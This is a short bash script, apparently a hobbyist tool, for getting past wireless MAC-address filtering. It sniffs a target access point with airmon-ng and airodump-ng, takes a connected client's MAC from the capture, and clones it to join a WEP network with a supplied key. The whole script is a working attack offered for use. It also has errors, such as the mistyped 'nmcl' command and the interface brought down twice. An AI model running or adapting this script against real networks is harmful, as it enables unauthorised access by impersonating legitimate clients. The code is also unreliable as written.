# Spoof mac address to bypass filtering
# Doshmajhan

echo "Scanning for devices"

airmon-ng start wlp3s0
screen -S air -d -m airodump-ng -c 9 --bssid 00:1C:0E:26:93:E0 -i wlp3s0mon --write output --write-interval 10 --output-format csv > /dev/null 2>&1

sleep 30

temp=`sed 1,5d output-01.csv`
echo $temp > temp.txt

while read p; do
    mac=`echo $p | awk '{print $1}'`
    mac=`echo "${mac//,}"`
    echo $mac
done < temp.txt

screen -S air -X quit
airmon-ng stop wlp3s0mon

echo "Spoofing MAC and connecting to network"

iwconfig wlp3s0 essid Adam-WEP key 1234567890
ifconfig wlp3s0 down
ifconfig wlp3s0 down
sleep 1

nmcl connection modify "Adam-WEP 1" wifi.cloned-mac-address $mac
nmcli connection up "Adam-WEP 1"

echo "Done"
